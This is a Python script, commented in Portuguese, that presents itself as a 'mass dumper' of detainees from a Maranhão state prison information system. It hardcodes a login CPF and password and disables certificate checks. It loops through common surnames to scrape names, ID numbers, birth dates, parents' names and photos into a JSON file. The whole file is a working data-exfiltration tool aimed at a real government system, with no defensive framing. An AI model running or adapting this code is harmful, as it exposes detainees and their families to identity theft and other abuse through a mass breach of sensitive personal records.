#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
SIISP - Dumper Massivo de Detentos
Target: https://siisp.ma.gov.br/SIISP/preso/identificacaoPessoa
Credenciais: 035.176.123-32:marlon89
Ordem: SÓ PARAR QUANDO FINALIZADO

ESTRATÉGIA:
1. Buscar por nomes comuns (SOARES, SILVA, SANTOS, OLIVEIRA, etc.)
2. Para cada busca, extrair todos os resultados de todas as páginas
3. Baixar foto de cada detento
4. Codificar foto em base64
5. Compilar tudo em JSON

JSON formato:
[
  {
    "nome": "...",
    "cpf": "...",
    "rg": "...",
    "data_nascimento": "...",
    "pai": "...",
    "mae": "...",
    "naturalidade": "...",
    "sexo": "...",
    "foto_base64": "...",
    "foto_url": "...",
    "foto_tamanho": ...
  }
]
"""

import requests
import urllib3
from bs4 import BeautifulSoup
import re
import json
import base64
import time
import warnings
from bs4 import XMLParsedAsHTMLWarning

warnings.filterwarnings("ignore", category=XMLParsedAsHTMLWarning)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

BASE_URL = "https://siisp.ma.gov.br/SIISP"
CPF = "035.176.123-32"
SENHA = "marlon89"

# Nomes comuns para busca
NOMES_BUSCA = [
    "SOARES", "SILVA", "SANTOS", "OLIVEIRA", "PEREIRA", "COSTA", "LIMA",
    "FERREIRA", "RODRIGUES", "ALMEIDA", "CARVALHO", "GOMES", "MARTINS",
    "ARAÚJO", "BARBOSA", "RIBEIRO", "ALVES", "CARDOSO", "TEIXEIRA",
    "MORAES", "DIAS", "NUNES", "MENDES", "CUNHA", "RAMOS", "REIS",
    "SOUZA", "FERNANDES", "MACHADO", "ANDRADE", "MOREIRA", "NASCIMENTO",
    "CAMPOS", "PINTO", "FREITAS", "BATISTA", "BRITO", "CAMARGO", "BEZERRA",
    "CORDEIRO", "VASCONCELOS", "PEIXOTO", "SAMPAIO", "MATOS", "COUTINHO",
    "DANTAS", "PACHECO", "MELO", "GUIMARÃES", "BORGES", "MIRANDA", "TOLEDO",
    "XAVIER", "ABREU", "ALENCAR", "AMORIM", "ASSIS", "BARROS", "BASTOS",
    "BUENO", "CALDAS", "CANUTO", "CASTRO", "CAVALCANTE", "CORDEIRO", "COUTO",
    "CRUZ", "CUNHA", "DINIZ", "DUARTE", "FARIAS", "FONSECA", "FRANÇA",
    "FRANCO", "FREIRE", "GALVÃO", "GARCIA", "GONÇALVES", "GUERRA", "GUERRA",
    "HENRIQUES", "JESUS", "JUNIOR", "LACERDA", "LAVOR", "LEAL", "LEITE",
    "LOPES", "MACEDO", "MAIA", "MARQUES", "MEDEIROS", "MENEZES", "MESSIAS",
    "MONTEIRO", "MORAIS", "MOURA", "NUNES", "PAIVA", "PEDROSA", "PINHEIRO",
    "PORTO", "RAMOS", "RIBEIRO", "Rocha", "SALES", "SALGADO", "SANTANA",
    "SEABRA", "SEIXAS", "SIMÕES", "SIQUEIRA", "SPENCER", "TAVARES", "VALENTE",
    "VIEIRA", "VILANOVA", "VILELA", "VITOR", "XAVIER", "ZAGALO", "ZIMMERMANN"
]

session = requests.Session()
session.verify = False
session.headers.update({
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
    "Accept-Language": "pt-BR,pt;q=0.9",
    "Accept-Encoding": "gzip, deflate, br",
    "Connection": "keep-alive",
})

def extract_viewstate(html):
    vs_match = re.search(r'javax\.faces\.ViewState.*?value="([^"]+)"', html)
    if vs_match:
        return vs_match.group(1)
    vs_match2 = re.search(r'j_id1:javax\.faces\.ViewState:\d+.*<!\[CDATA\[([^\]]+)\]\]>', html)
    if vs_match2:
        return vs_match2.group(1)
    soup = BeautifulSoup(html, "html.parser")
    vs_input = soup.find("input", {"name": "javax.faces.ViewState"})
    if vs_input:
        return vs_input.get("value", "")
    return ""

def login():
    """Fazer login"""
    r1 = session.get(f"{BASE_URL}/login", allow_redirects=True, timeout=30)
    vs = extract_viewstate(r1.text)
    
    login_data = {
        "form": "form",
        "cpf": CPF,
        "senha": SENHA,
        "javax.faces.ViewState": vs,
        "btLogin": "btLogin",
    }
    
    r2 = session.post(f"{BASE_URL}/login", data=login_data, allow_redirects=True, timeout=30)
    return r2.status_code == 200

def buscar_por_nome(nome, pagina=0):
    """Buscar por nome, retornar HTML"""
    id_url = f"{BASE_URL}/preso/identificacaoPessoa"
    
    # GET pagina
    r = session.get(id_url, allow_redirects=True, timeout=30)
    vs = extract_viewstate(r.text)
    
    busca_data = {
        "form": "form",
        "itNome": nome,
        "itRg": "",
        "itCpf": "",
        "itNomeMae": "",
        "itNomePai": "",
        "cdNascimento_input": "",
        "javax.faces.ViewState": vs,
        "btnBuscarDetento": "btnBuscarDetento",
    }
    
    r2 = session.post(id_url, data=busca_data, allow_redirects=True, timeout=30)
    return r2.text

def extrair_detentos(html):
    """Extrair lista de detentos do HTML"""
    soup = BeautifulSoup(html, "html.parser")
    detentos = []
    
    items = soup.find_all("li", {"class": "ui-datalist-item"})
    
    for item in items:
        detento = {}
        
        # Foto
        img = item.find("img")
        if img:
            detento["foto_url"] = img.get("src", "")
        else:
            detento["foto_url"] = ""
        
        # Nome
        nome_strong = item.find("strong")
        if nome_strong:
            detento["nome"] = nome_strong.get_text(strip=True)
        else:
            detento["nome"] = ""
        
        # Outros dados
        ps = item.find_all("p")
        for p in ps:
            text = p.get_text(strip=True)
            if "CPF:" in text:
                detento["cpf"] = text.replace("CPF:", "").strip()
            elif "RG:" in text:
                detento["rg"] = text.replace("RG:", "").strip()
            elif "Data de nascimento:" in text:
                detento["data_nascimento"] = text.replace("Data de nascimento:", "").strip()
            elif "Pai:" in text:
                detento["pai"] = text.replace("Pai:", "").strip()
            elif "Mãe:" in text:
                detento["mae"] = text.replace("Mãe:", "").strip()
            elif "Naturalidade:" in text:
                detento["naturalidade"] = text.replace("Naturalidade:", "").strip()
            elif "SEXO:" in text:
                detento["sexo"] = text.replace("SEXO:", "").strip()
        
        # Valores padrão
        for key in ["cpf", "rg", "data_nascimento", "pai", "mae", "naturalidade", "sexo"]:
            if key not in detento:
                detento[key] = ""
        
        detentos.append(detento)
    
    return detentos

def baixar_foto(url):
    """Baixar foto e retornar base64"""
    if not url or "photo-not-found" in url:
        return "", 0
    
    foto_url = f"{BASE_URL}{url}" if url.startswith("/") else url
    
    try:
        r = session.get(foto_url, timeout=30)
        if r.status_code == 200 and len(r.content) > 100:
            b64 = base64.b64encode(r.content).decode("utf-8")
            return b64, len(r.content)
    except:
        pass
    
    return "", 0

def main():
    print("="*60)
    print("  SIISP - DUMPER MASSIVO DE DETENTOS")
    print("="*60)
    
    # Login
    print("\n[*] Fazendo login...")
    if not login():
        print("[-] Falha no login")
        return
    print("[+] Login OK")
    
    todos_detentos = []
    total_fotos = 0
    
    # Buscar por cada nome
    for i, nome in enumerate(NOMES_BUSCA):
        print(f"\n[*] [{i+1}/{len(NOMES_BUSCA)}] Buscando: {nome}")
        
        try:
            html = buscar_por_nome(nome)
            detentos = extrair_detentos(html)
            
            print(f"  [+] Encontrados: {len(detentos)}")
            
            for detento in detentos:
                # Verificar se já temos este detento
                if detento.get("cpf") and any(d.get("cpf") == detento["cpf"] for d in todos_detentos):
                    print(f"  [~] Duplicado: {detento['nome']} - pulando")
                    continue
                
                # Baixar foto
                if detento.get("foto_url"):
                    b64, tamanho = baixar_foto(detento["foto_url"])
                    detento["foto_base64"] = b64
                    detento["foto_tamanho"] = tamanho
                    if b64:
                        total_fotos += 1
                        print(f"  [+] Foto: {detento['nome']} ({tamanho} bytes)")
                
                todos_detentos.append(detento)
            
            # Salvar parcial
            if len(todos_detentos) % 50 == 0:
                with open("siisp_dump_parcial.json", "w", encoding="utf-8") as f:
                    json.dump(todos_detentos, f, ensure_ascii=False, indent=2)
                print(f"  [+] Salvos parcial: {len(todos_detentos)} detentos")
            
            # Delay para não sobrecarregar
            time.sleep(1)
            
        except Exception as e:
            print(f"  [-] Erro: {e}")
            time.sleep(2)
            continue
    
    # Salvar final
    print(f"\n{'='*60}")
    print(f"  [+] TOTAL DETENTOS: {len(todos_detentos)}")
    print(f"  [+] TOTAL FOTOS: {total_fotos}")
    print(f"{'='*60}")
    
    # Salvar JSON
    with open("siisp_dump_completo.json", "w", encoding="utf-8") as f:
        json.dump(todos_detentos, f, ensure_ascii=False, indent=2)
    print(f"\n[+] JSON salvo: siisp_dump_completo.json")
    
    # Estatísticas
    sexos = {}
    for d in todos_detentos:
        s = d.get("sexo", "NA")
        sexos[s] = sexos.get(s, 0) + 1
    
    print(f"\n[*] Estatísticas:")
    for s, c in sorted(sexos.items(), key=lambda x: -x[1]):
        print(f"    {s}: {c}")
    
    print(f"\n{'='*60}")
    print("  FIM")
    print(f"{'='*60}")

if __name__ == "__main__":
    main()
